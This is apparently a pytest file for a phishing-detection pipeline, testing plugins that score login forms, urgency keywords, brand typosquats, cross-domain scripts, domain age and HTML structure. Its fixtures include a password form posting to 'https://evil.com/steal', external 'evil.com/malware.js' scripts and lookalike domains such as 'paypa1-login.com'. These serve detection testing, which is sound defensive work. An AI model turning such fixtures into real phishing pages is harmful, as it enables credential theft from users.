"""Test Phase 1 analysis plugins."""
import pytest
from datetime import datetime, timezone, timedelta
from plugins.base import SnapshotContext, PluginType
from plugins.login_detector import LoginDetector
from plugins.keyword_detector import KeywordDetector
from plugins.brand_match import BrandMatch
from plugins.external_js_detector import ExternalJSDetector
from plugins.nrd_age_scorer import NRDAgeScorer
from plugins.html_hasher import HTMLHasher


def make_context(html="<html><body>Safe content</body></html>",
                 domain="example.com", text="Safe content",
                 forms=None, links=None, scripts=None,
                 metadata=None, snapshot_record=None) -> SnapshotContext:
    return SnapshotContext(
        snapshot_id="snap1", domain=domain, html=html, text=text,
        forms=forms or [], links=links or [], scripts=scripts or [],
        metadata=metadata or {}, snapshot_record=snapshot_record or {},
    )


# --- Login Detector ---

def test_login_detector_finds_password_field():
    html = '<form><input type="password" name="pass"><input type="submit"></form>'
    ctx = make_context(html=html, forms=[{"has_password": True, "action": "/login"}])
    result = LoginDetector().run(ctx)
    assert result.score_contribution > 0
    assert "login_form_detected" in result.tags


def test_login_detector_no_password():
    ctx = make_context()
    result = LoginDetector().run(ctx)
    assert result.score_contribution == 0


def test_login_detector_hidden_field():
    html = '<form><input type="hidden" name="token" value="x"><input type="password"></form>'
    ctx = make_context(html=html, forms=[{"has_password": True, "has_hidden": True}])
    result = LoginDetector().run(ctx)
    assert "hidden_field_detected" in result.tags


def test_login_detector_external_post_is_hard_signal():
    ctx = make_context(html='<form action="https://evil.com/steal"><input type="password"></form>',
                       domain="safe.com",
                       forms=[{"has_password": True, "action": "https://evil.com/steal"}])
    result = LoginDetector().run(ctx)
    assert "credential_exfil" in result.tags


def test_login_detector_fallback_raw_html_password():
    """Fallback: detect password field in raw HTML even if forms list is empty."""
    html = '<form><input type="password" name="pass"></form>'
    ctx = make_context(html=html, forms=[])
    result = LoginDetector().run(ctx)
    assert result.score_contribution > 0
    assert "login_form_detected" in result.tags


def test_login_detector_external_action_adds_score():
    ctx = make_context(domain="safe.com",
                       forms=[{"has_password": False, "action": "https://evil.com/submit"}])
    result = LoginDetector().run(ctx)
    assert "external_form_action" in result.tags
    assert result.score_contribution > 0


def test_login_detector_legit_domain_reduces_score():
    """Login form on a known legit brand domain should score much lower."""
    html = '<form><input type="password" name="pass"><input type="submit"></form>'
    # Legit domain
    legit_ctx = make_context(html=html, domain="paypal.com",
                             forms=[{"has_password": True, "action": "/login"}])
    legit_result = LoginDetector().run(legit_ctx)
    assert legit_result.score_contribution <= 10
    assert "login_form_legit_domain" in legit_result.tags
    # Non-legit domain
    phish_ctx = make_context(html=html, domain="paypa1-login.com",
                             forms=[{"has_password": True, "action": "/auth"}])
    phish_result = LoginDetector().run(phish_ctx)
    assert phish_result.score_contribution >= 30
    assert "login_form_detected" in phish_result.tags


# --- Keyword Detector ---

def test_keyword_detector_finds_urgency():
    ctx = make_context(text="Your account will be suspended. Verify immediately. OTP required.")
    result = KeywordDetector().run(ctx)
    assert result.score_contribution > 0
    assert "suspicious_keywords" in result.tags


def test_keyword_detector_clean_text():
    ctx = make_context(text="Welcome to our website about cats and dogs.")
    result = KeywordDetector().run(ctx)
    assert result.score_contribution == 0


def test_keyword_detector_caps():
    """Keywords should match regardless of case."""
    ctx = make_context(text="VERIFY your account. SUSPEND immediately.")
    result = KeywordDetector().run(ctx)
    assert result.score_contribution > 0
    assert "suspicious_keywords" in result.tags


def test_keyword_detector_score_capped():
    """Score should cap at 15 even with many hits."""
    ctx = make_context(text="verify secure update login otp suspend expire confirm unlock restore immediately unauthorized validate reactivate")
    result = KeywordDetector().run(ctx)
    assert result.score_contribution <= 15


def test_keyword_detector_findings_total_hits():
    ctx = make_context(text="verify verify verify")
    result = KeywordDetector().run(ctx)
    assert result.findings["total_hits"] == 3
    assert len(result.findings["matches"]) == 3


# --- Brand Match ---

def test_brand_match_finds_paypal_in_domain():
    ctx = make_context(domain="paypa1-secure-login.com")
    result = BrandMatch().run(ctx)
    assert result.score_contribution > 0
    assert "brand_match" in result.tags


def test_brand_match_no_brand():
    ctx = make_context(domain="totally-random-site.org")
    result = BrandMatch().run(ctx)
    assert result.score_contribution == 0


def test_brand_match_in_content():
    """Brand mentioned 2+ times in content should score."""
    ctx = make_context(domain="random.com", text="Login to your PayPal account. PayPal support here.")
    result = BrandMatch().run(ctx)
    assert result.score_contribution > 0
    assert "brand_match" in result.tags


def test_brand_match_content_single_mention_no_score():
    """Brand mentioned once in content should NOT score (needs 2+)."""
    ctx = make_context(domain="random.com", text="Login to your PayPal account.")
    result = BrandMatch().run(ctx)
    assert result.score_contribution == 0


def test_brand_match_legit_domain_gate():
    """Known brand on legitimate domain should get score=0 (hard gate)."""
    from plugins.brand_match import is_legit_domain
    # Exact match
    assert is_legit_domain("google.com", "google") is True
    # Subdomain of legit domain
    assert is_legit_domain("accounts.google.com", "google") is True
    # Phishing lookalike should NOT be legit
    assert is_legit_domain("google-secure-login.com", "google") is False
    # Typosquat should NOT be legit
    assert is_legit_domain("paypa1-login.com", "paypal") is False

    # Legit brand domain should produce zero score from brand_match
    ctx = make_context(domain="paypal.com", text="PayPal PayPal account")
    result = BrandMatch().run(ctx)
    assert result.score_contribution == 0
    assert "legit_brand_domain:paypal" in result.tags


def test_brand_match_homoglyph_normalization():
    """paypa1 should normalize to paypal via homoglyph map (1 -> l)."""
    ctx = make_context(domain="paypa1-secure.com")
    result = BrandMatch().run(ctx)
    assert "paypal_detected" in result.tags
    # Brand alone is a weak signal (5); full impersonation score (25)
    # requires additional signals (login form, keywords, typosquat)
    assert result.score_contribution >= 5


def test_brand_match_confidence_domain_vs_content():
    """Brand in domain alone gives low confidence (0.50); full impersonation
    context raises it. Content-only brand on non-legit domain also gives 0.50."""
    domain_ctx = make_context(domain="paypal-secure.com")
    domain_result = BrandMatch().run(domain_ctx)
    assert domain_result.confidence >= 0.50

    content_ctx = make_context(domain="random.com", text="PayPal PayPal account")
    content_result = BrandMatch().run(content_ctx)
    assert content_result.confidence >= 0.50


# --- External JS Detector ---

def test_external_js_detects_cross_domain():
    ctx = make_context(domain="safe.com",
                       scripts=[{"src": "https://evil.com/malware.js", "inline": False}])
    result = ExternalJSDetector().run(ctx)
    assert result.score_contribution > 0


def test_external_js_same_domain():
    ctx = make_context(domain="safe.com",
                       scripts=[{"src": "https://safe.com/app.js", "inline": False}])
    result = ExternalJSDetector().run(ctx)
    assert result.score_contribution == 0


def test_external_js_multiple_cross_domain():
    ctx = make_context(domain="safe.com", scripts=[
        {"src": "https://evil.com/a.js", "inline": False},
        {"src": "https://evil.com/b.js", "inline": False},
        {"src": "https://evil.com/c.js", "inline": False},
        {"src": "https://evil.com/d.js", "inline": False},
    ])
    result = ExternalJSDetector().run(ctx)
    assert result.score_contribution == 10  # min(10, 4*3) = 10


def test_external_js_inline_ignored():
    ctx = make_context(domain="safe.com", scripts=[{"src": "", "inline": True}])
    result = ExternalJSDetector().run(ctx)
    assert result.score_contribution == 0


def test_external_js_tag():
    ctx = make_context(domain="safe.com",
                       scripts=[{"src": "https://evil.com/malware.js", "inline": False}])
    result = ExternalJSDetector().run(ctx)
    assert "external_js_detected" in result.tags


# --- NRD Age Scorer ---

def test_nrd_age_scores_young_domain():
    two_days_ago = (datetime.now(timezone.utc) - timedelta(days=2)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": two_days_ago})
    result = NRDAgeScorer().run(ctx)
    assert result.score_contribution == 10


def test_nrd_age_old_domain_low_score():
    two_years_ago = (datetime.now(timezone.utc) - timedelta(days=730)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": two_years_ago})
    result = NRDAgeScorer().run(ctx)
    assert result.score_contribution == 0


def test_nrd_age_medium_domain():
    """Domain 10 days old should score 3 (8-30 day range)."""
    ten_days_ago = (datetime.now(timezone.utc) - timedelta(days=10)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": ten_days_ago})
    result = NRDAgeScorer().run(ctx)
    assert result.score_contribution == 3


def test_nrd_age_5_day_domain():
    """Domain 5 days old should score 7 (4-7 day range)."""
    five_days_ago = (datetime.now(timezone.utc) - timedelta(days=5)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": five_days_ago})
    result = NRDAgeScorer().run(ctx)
    assert result.score_contribution == 7


def test_nrd_age_no_first_seen():
    ctx = make_context(snapshot_record={})
    result = NRDAgeScorer().run(ctx)
    assert result.score_contribution == 0


def test_nrd_age_tag_present_when_scored():
    two_days_ago = (datetime.now(timezone.utc) - timedelta(days=2)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": two_days_ago})
    result = NRDAgeScorer().run(ctx)
    assert "nrd_age" in result.tags


def test_nrd_age_tag_absent_when_zero():
    two_years_ago = (datetime.now(timezone.utc) - timedelta(days=730)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": two_years_ago})
    result = NRDAgeScorer().run(ctx)
    assert "nrd_age" not in result.tags


# --- HTML Hasher ---

def test_html_hasher_returns_hash():
    ctx = make_context(html="<html><body>content</body></html>")
    result = HTMLHasher().run(ctx)
    assert result.plugin_type == PluginType.FINGERPRINT
    assert "structural_hash" in result.findings
    assert len(result.findings["structural_hash"]) == 64  # SHA-256


def test_html_hasher_different_html_different_hash():
    ctx1 = make_context(html="<html><body>A</body></html>")
    ctx2 = make_context(html="<html><body>B</body></html>")
    result1 = HTMLHasher().run(ctx1)
    result2 = HTMLHasher().run(ctx2)
    # Structural hash should be same (same tag structure)
    assert result1.findings["structural_hash"] == result2.findings["structural_hash"]
    # Content hash should differ
    assert result1.findings["content_hash"] != result2.findings["content_hash"]


def test_html_hasher_zero_score():
    ctx = make_context(html="<html><body>content</body></html>")
    result = HTMLHasher().run(ctx)
    assert result.score_contribution == 0


def test_html_hasher_different_structure_different_hash():
    ctx1 = make_context(html="<html><body>text</body></html>")
    ctx2 = make_context(html="<html><body><div>text</div></body></html>")
    result1 = HTMLHasher().run(ctx1)
    result2 = HTMLHasher().run(ctx2)
    assert result1.findings["structural_hash"] != result2.findings["structural_hash"]


def test_html_hasher_tag():
    ctx = make_context(html="<html><body>content</body></html>")
    result = HTMLHasher().run(ctx)
    assert "structural_hash" in result.tags